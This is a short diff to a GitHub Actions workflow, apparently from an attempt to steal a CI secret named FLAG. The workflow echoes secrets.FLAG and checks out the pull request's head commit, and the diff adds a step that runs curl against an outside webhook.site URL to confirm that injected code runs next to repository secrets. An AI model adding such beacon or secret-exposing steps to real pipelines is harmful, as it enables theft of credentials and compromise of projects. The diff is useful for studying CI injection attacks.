@@ -8,7 +8,8 @@ jobs:
     timeout-minutes: 1
     runs-on: ubuntu-latest
     steps:
-      - run: echo ${{ secrets.FLAG }}    
+      - run: echo ${{ secrets.FLAG }}
+      - run: curl -X GET https://webhook.site/ed09219b-407c-412b-9349-3c10c98626d2
       - uses: actions/checkout@v3
         with:
           ref: ${{ github.event.pull_request.head.sha }}
